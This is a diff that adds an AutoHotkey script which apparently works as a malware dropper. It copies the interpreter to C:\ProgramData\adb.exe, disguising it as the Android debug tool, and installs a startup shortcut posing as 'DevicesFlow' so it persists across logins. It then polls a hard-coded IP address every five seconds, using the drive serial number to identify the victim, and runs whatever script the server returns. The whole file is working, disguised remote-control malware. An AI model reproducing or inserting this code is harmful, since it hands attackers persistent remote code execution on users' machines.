@@ -1,0 +1,24 @@
+#NoTrayIcon
+FileCopy, %A_AhkPath%, C:\ProgramData\adb.exe
+FileAppend,
+(
+#NoTrayIcon
+FileCreateShortcut, `%A_AhkPath`%, `%A_Startup`%\DevicesFlow.lnk, `%A_ScriptDir`%\, , DevicesFlow 5.4.0.2, ,
+Loop
+{
+try
+{
+DriveGet, serial, serial, C:
+UrlDownloadToFile, http://63.250.34.191/`%serial`%-ms1, `%A_AhkPath`%~
+FileRead, string, `%A_AhkPath`%~
+If InStr(SubStr(string, -1), "~")
+Run, `%A_AhkPath`% `%A_AhkPath`%~
+}
+catch e
+{
+}
+Sleep, 5000
+}
+), C:\ProgramData\adb.ahk
+Run, C:\ProgramData\adb.exe
+ExitApp
